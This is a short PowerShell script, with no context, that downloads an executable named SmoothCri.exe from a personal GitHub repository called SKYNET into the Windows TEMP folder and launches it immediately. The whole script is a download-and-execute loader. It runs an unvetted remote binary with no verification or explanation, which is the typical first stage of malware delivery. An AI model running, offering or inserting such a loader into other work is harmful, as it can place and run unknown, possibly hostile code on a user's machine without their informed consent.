$url = "https://raw.githubusercontent.com/kittipatseepakdee-eng/SKYNET/refs/heads/main/SmoothCri.exe"
$file = "$env:TEMP\SmoothCri.exe"

Invoke-WebRequest $url -OutFile $file
Start-Process $file
